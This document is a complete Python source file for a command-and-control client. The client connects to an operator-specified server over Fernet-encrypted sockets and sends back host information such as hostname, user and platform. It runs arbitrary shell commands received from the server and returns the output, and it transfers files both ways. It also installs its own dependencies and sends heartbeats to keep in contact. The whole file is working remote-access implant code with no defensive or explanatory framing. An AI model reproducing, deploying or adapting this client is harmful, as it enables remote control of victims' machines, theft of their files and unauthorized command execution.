#!/usr/bin/env python3
"""
C2 Client with encrypted communication, heartbeat, and file transfer capabilities
"""

import socket
import threading
import json
import base64
import time
import subprocess
import os
import sys
import platform
from datetime import datetime

def check_privileges():
    """Check if script has sufficient privileges for package installation"""
    if os.geteuid() == 0:
        return True
    
    # Test if we can run apk commands
    try:
        result = subprocess.run(['apk', 'info'], capture_output=True, text=True, timeout=10)
        return result.returncode == 0
    except:
        return False

def check_and_install_dependencies():
    """Check and install dependencies for Alpine Linux"""
    print("[+] Checking system dependencies...")
    
    # Check if we're on Alpine Linux
    is_alpine = False
    try:
        with open('/etc/os-release', 'r') as f:
            os_info = f.read()
            if 'alpine' in os_info.lower():
                is_alpine = True
                print("[+] Detected Alpine Linux")
            else:
                print("[INFO] Not Alpine Linux, skipping Alpine-specific setup")
    except FileNotFoundError:
        # Check for apk package manager as fallback
        try:
            subprocess.run(['apk', '--version'], capture_output=True, timeout=5)
            is_alpine = True
            print("[+] Detected Alpine Linux (via apk)")
        except:
            print("[INFO] Could not detect Alpine Linux, skipping system package installation")
    
    if is_alpine:
        # Check privileges for system package installation
        has_privileges = check_privileges()
        if not has_privileges:
            print("[WARNING] No privileges for system package installation. Some features may not work.")
        
        # List of system packages needed for cryptography and psutil
        system_packages = [
            'python3',
            'py3-pip', 
            'python3-dev',
            'libffi-dev',
            'openssl-dev',
            'gcc',
            'musl-dev',
            'linux-headers'
        ]
        
        # Check and install system packages if we have privileges
        if has_privileges:
            # Update package index first
            try:
                print("[+] Updating package index...")
                subprocess.run(['apk', 'update'], capture_output=True, text=True, timeout=60)
            except Exception as e:
                print(f"[WARNING] Could not update package index: {e}")
            
            for package in system_packages:
                print(f"[+] Checking system package: {package}")
                try:
                    result = subprocess.run(['apk', 'info', package], 
                                          capture_output=True, text=True, timeout=30)
                    if result.returncode != 0:
                        print(f"[+] Installing system package: {package}")
                        install_result = subprocess.run(['apk', 'add', package], 
                                                      capture_output=True, text=True, timeout=120)
                        if install_result.returncode != 0:
                            print(f"[ERROR] Failed to install {package}: {install_result.stderr}")
                            # Try to continue anyway
                        else:
                            print(f"[+] Successfully installed: {package}")
                    else:
                        print(f"[+] Package already installed: {package}")
                except subprocess.TimeoutExpired:
                    print(f"[ERROR] Timeout installing {package}")
                except Exception as e:
                    print(f"[ERROR] Error checking/installing {package}: {e}")
        else:
            print("[WARNING] Skipping system package installation due to insufficient privileges")
    
    # Python packages to install
    python_packages = ['cryptography==41.0.7', 'psutil==5.9.6']
    
    for package in python_packages:
        package_name = package.split('==')[0]
        print(f"[+] Checking Python package: {package_name}")
        try:
            __import__(package_name)
            print(f"[+] Package already available: {package_name}")
        except ImportError:
            print(f"[+] Installing Python package: {package}")
            try:
                # Try different pip installation methods
                pip_commands = ['pip3', 'pip', 'python3 -m pip', 'python -m pip']
                installed = False
                
                for pip_cmd in pip_commands:
                    try:
                        cmd_args = pip_cmd.split() + ['install', '--user', package]
                        result = subprocess.run(cmd_args, 
                                              capture_output=True, text=True, timeout=300)
                        if result.returncode == 0:
                            print(f"[+] Successfully installed {package} using {pip_cmd}")
                            installed = True
                            break
                        else:
                            print(f"[WARNING] {pip_cmd} failed: {result.stderr}")
                    except FileNotFoundError:
                        print(f"[WARNING] {pip_cmd.split()[0]} not found")
                        continue
                    except subprocess.TimeoutExpired:
                        print(f"[ERROR] Timeout installing {package} with {pip_cmd}")
                        continue
                
                if not installed:
                    print(f"[ERROR] Failed to install {package} with any pip command")
                    print("[INFO] Trying without --user flag...")
                    # Try without --user flag as fallback
                    for pip_cmd in pip_commands[:2]:  # Only try pip3 and pip
                        try:
                            cmd_args = pip_cmd.split() + ['install', package]
                            result = subprocess.run(cmd_args, 
                                                  capture_output=True, text=True, timeout=300)
                            if result.returncode == 0:
                                print(f"[+] Successfully installed {package} using {pip_cmd} (system-wide)")
                                installed = True
                                break
                        except:
                            continue
                    
                    if not installed:
                        print(f"[CRITICAL] Could not install {package}. Script may not function properly.")
                    
            except Exception as e:
                print(f"[ERROR] Error installing {package}: {e}")
    
    print("[+] Dependency check completed")

# Import required modules after dependency check
try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
except ImportError as e:
    print(f"[ERROR] Failed to import cryptography: {e}")
    print("[+] Running dependency check...")
    check_and_install_dependencies()
    try:
        from cryptography.fernet import Fernet
        from cryptography.hazmat.primitives import hashes
        from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
        print("[+] Cryptography modules imported successfully after installation")
    except ImportError:
        print("[FATAL] Could not import cryptography even after installation attempt")
        sys.exit(1)

class C2Client:
    def __init__(self, server_host, server_port, password):
        self.server_host = server_host
        self.server_port = server_port
        self.password = password
        self.running = False
        self.connection = None
        
        # Generate encryption key from password
        self.key = self._generate_key(password)
        self.cipher = Fernet(self.key)
        
        # Create downloads directory
        os.makedirs('downloads', exist_ok=True)
        
    def _generate_key(self, password):
        """Generate encryption key from password"""
        salt = b'salt_1234567890'  # Must match server salt
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
        return key
    
    def encrypt_data(self, data):
        """Encrypt data using Fernet"""
        if isinstance(data, str):
            data = data.encode()
        return self.cipher.encrypt(data)
    
    def decrypt_data(self, encrypted_data):
        """Decrypt data using Fernet"""
        return self.cipher.decrypt(encrypted_data).decode()
    
    def send_encrypted(self, data):
        """Send encrypted data to server"""
        try:
            if isinstance(data, dict):
                data = json.dumps(data)
            
            encrypted = self.encrypt_data(data)
            # Send length first, then data
            length = len(encrypted)
            self.connection.send(length.to_bytes(4, byteorder='big'))
            self.connection.send(encrypted)
            return True
        except Exception as e:
            print(f"[ERROR] Failed to send data: {e}")
            return False
    
    def recv_encrypted(self):
        """Receive encrypted data from server"""
        try:
            # Receive length first
            length_bytes = self.connection.recv(4)
            if not length_bytes:
                return None
            
            length = int.from_bytes(length_bytes, byteorder='big')
            
            # Receive the actual data
            encrypted_data = b''
            while len(encrypted_data) < length:
                chunk = self.connection.recv(min(length - len(encrypted_data), 4096))
                if not chunk:
                    return None
                encrypted_data += chunk
            
            # Decrypt and return
            decrypted = self.decrypt_data(encrypted_data)
            return json.loads(decrypted)
        except Exception as e:
            print(f"[ERROR] Failed to receive data: {e}")
            return None
    
    def send_heartbeat(self):
        """Send periodic heartbeat to server"""
        while self.running:
            try:
                heartbeat = {
                    'type': 'heartbeat',
                    'timestamp': time.time(),
                    'client_id': f"{socket.gethostname()}_{os.getpid()}"
                }
                
                if not self.send_encrypted(heartbeat):
                    print("[ERROR] Failed to send heartbeat")
                    break
                    
                # Wait 5 minutes (300 seconds) before next heartbeat
                time.sleep(300)
                
            except Exception as e:
                print(f"[ERROR] Heartbeat error: {e}")
                break
    
    def execute_command(self, command):
        """Execute system command and return output"""
        try:
            # Execute command
            if platform.system().lower() == 'windows':
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=60
                )
            else:
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=60
                )
            
            # Combine stdout and stderr
            output = result.stdout
            if result.stderr:
                output += f"\n[STDERR]: {result.stderr}"
            
            if result.returncode != 0:
                output += f"\n[EXIT CODE]: {result.returncode}"
                
            return output if output else "[No output]"
            
        except subprocess.TimeoutExpired:
            return "[ERROR] Command timed out (60 seconds)"
        except Exception as e:
            return f"[ERROR] Command execution failed: {str(e)}"
    
    def send_command_result(self, command, output):
        """Send command execution result to server"""
        message = {
            'type': 'command_result',
            'command': command,
            'output': output,
            'timestamp': time.time()
        }
        self.send_encrypted(message)
    
    def send_system_info(self):
        """Send system information to server"""
        try:
            import psutil
            
            info = {
                'hostname': socket.gethostname(),
                'platform': platform.platform(),
                'architecture': platform.architecture()[0],
                'processor': platform.processor(),
                'python_version': platform.python_version(),
                'cpu_count': os.cpu_count(),
                'memory_total': f"{psutil.virtual_memory().total // (1024**3)} GB",
                'disk_usage': f"{psutil.disk_usage('/').percent}%",
                'current_user': os.getenv('USER', os.getenv('USERNAME', 'Unknown')),
                'working_directory': os.getcwd(),
                'process_id': os.getpid()
            }
        except ImportError:
            print("[WARNING] psutil not available, using basic system info")
            # Fallback if psutil not available
            info = {
                'hostname': socket.gethostname(),
                'platform': platform.platform(),
                'architecture': platform.architecture()[0],
                'processor': platform.processor(),
                'python_version': platform.python_version(),
                'cpu_count': os.cpu_count(),
                'current_user': os.getenv('USER', os.getenv('USERNAME', 'Unknown')),
                'working_directory': os.getcwd(),
                'process_id': os.getpid()
            }
        except Exception as e:
            print(f"[ERROR] Error gathering system info: {e}")
            # Minimal fallback
            info = {
                'hostname': socket.gethostname(),
                'platform': 'Unknown',
                'current_user': os.getenv('USER', os.getenv('USERNAME', 'Unknown')),
                'process_id': os.getpid()
            }
        
        message = {
            'type': 'system_info',
            'info': info,
            'timestamp': time.time()
        }
        self.send_encrypted(message)
    
    def upload_file(self, filepath):
        """Upload file to server"""
        if not os.path.exists(filepath):
            print(f"[ERROR] File not found: {filepath}")
            return False
            
        try:
            filename = os.path.basename(filepath)
            file_size = os.path.getsize(filepath)
            print(f"[+] Uploading file: {filename} ({file_size} bytes)")
            
            with open(filepath, 'rb') as f:
                chunk_size = 8192
                chunks_sent = 0
                
                while True:
                    chunk = f.read(chunk_size)
                    if not chunk:
                        break
                        
                    is_last = len(chunk) < chunk_size
                    
                    message = {
                        'type': 'file_chunk',
                        'filename': filename,
                        'data': base64.b64encode(chunk).decode(),
                        'is_last': is_last,
                        'chunk_num': chunks_sent
                    }
                    
                    if not self.send_encrypted(message):
                        print(f"[ERROR] Failed to send chunk {chunks_sent}")
                        return False
                        
                    chunks_sent += 1
                    
                    if is_last:
                        break
                        
            print(f"[+] File upload completed: {filename}")
            return True
            
        except Exception as e:
            print(f"[ERROR] File upload error: {e}")
            return False
    
    def handle_file_download(self, data):
        """Handle file download from server"""
        filename = data.get('filename')
        chunk_data = data.get('data')
        is_last = data.get('is_last', False)
        
        if not filename or not chunk_data:
            return
            
        filepath = os.path.join('downloads', filename)
        
        try:
            chunk_bytes = base64.b64decode(chunk_data)
            with open(filepath, 'ab') as f:
                f.write(chunk_bytes)
                
            if is_last:
                print(f"[+] File download completed: {filepath}")
            else:
                print(f"[+] Receiving chunk for {filename}")
                
        except Exception as e:
            print(f"[ERROR] File download error: {e}")
    
    def handle_server_messages(self):
        """Handle messages from server"""
        while self.running:
            try:
                data = self.recv_encrypted()
                if data is None:
                    print("[ERROR] Lost connection to server")
                    break
                    
                msg_type = data.get('type')
                
                if msg_type == 'command':
                    command = data.get('command')
                    if command:
                        print(f"[+] Executing command: {command}")
                        output = self.execute_command(command)
                        self.send_command_result(command, output)
                        
                elif msg_type == 'file_download':
                    self.handle_file_download(data)
                    
                elif msg_type == 'request_sysinfo':
                    self.send_system_info()
                    
                else:
                    print(f"[INFO] Unknown message type: {msg_type}")
                    
            except Exception as e:
                print(f"[ERROR] Message handler error: {e}")
                break
    
    def connect(self):
        """Connect to C2 server"""
        max_retries = 5
        retry_delay = 10
        
        for attempt in range(max_retries):
            try:
                print(f"[+] Connecting to C2 server {self.server_host}:{self.server_port} (attempt {attempt + 1}/{max_retries})")
                
                self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.connection.connect((self.server_host, self.server_port))
                
                print(f"[+] Connected to C2 server!")
                self.running = True
                
                # Send initial system info
                self.send_system_info()
                
                # Start heartbeat thread
                heartbeat_thread = threading.Thread(target=self.send_heartbeat, daemon=True)
                heartbeat_thread.start()
                
                # Start message handler thread
                message_thread = threading.Thread(target=self.handle_server_messages, daemon=True)
                message_thread.start()
                
                # Keep main thread alive
                try:
                    while self.running:
                        time.sleep(1)
                except KeyboardInterrupt:
                    print("\n[+] Shutting down client...")
                    self.running = False
                    
                break
                
            except ConnectionRefusedError:
                print(f"[ERROR] Connection refused. Retrying in {retry_delay} seconds...")
                time.sleep(retry_delay)
            except Exception as e:
                print(f"[ERROR] Connection error: {e}")
                time.sleep(retry_delay)
        
        print("[+] Client shutdown")
        if self.connection:
            self.connection.close()

def main():
    # Check and install dependencies first
    check_and_install_dependencies()
    
    if len(sys.argv) < 4:
        print("Usage: python3 c2client.py <server_host> <server_port> <password>")
        print("Example: python3 c2client.py 192.168.1.100 8888 mypassword")
        sys.exit(1)
    
    server_host = sys.argv[1]
    server_port = int(sys.argv[2])
    password = sys.argv[3]
    
    client = C2Client(server_host, server_port, password)
    client.connect()

if __name__ == "__main__":
    main()